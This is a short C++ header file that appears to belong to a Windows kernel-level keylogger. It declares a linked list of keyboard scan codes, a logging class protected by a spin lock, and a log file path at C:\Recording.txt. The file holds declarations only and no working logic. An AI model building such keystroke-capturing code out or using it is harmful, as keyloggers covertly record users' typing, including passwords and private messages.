#pragma once
#include <main.h>

#define LOG_FILE L"\\??\\C:\\Recording.txt"

typedef struct _KEY_DATA
{
	USHORT MakeCode;
	USHORT Flags;
	_KEY_DATA* Next;
}KEY_DATA, * PKEY_DATA;

typedef struct _MAPPED_KEY
{
	PUCHAR MappedKey;
	int SizeOfKey;
}MAPPED_KEY, * PMAPPED_KEY;

class Log
{
private:
	int KeyCount; 
	PKEY_DATA Keys;
	SpinLock Lock;
public:
	void Init();
	void Log::Append(USHORT MakeCode, USHORT Flags);
	void Clean(bool TakeLock);
	void Write();

};


extern Log Recording;
extern bool WriteSignal;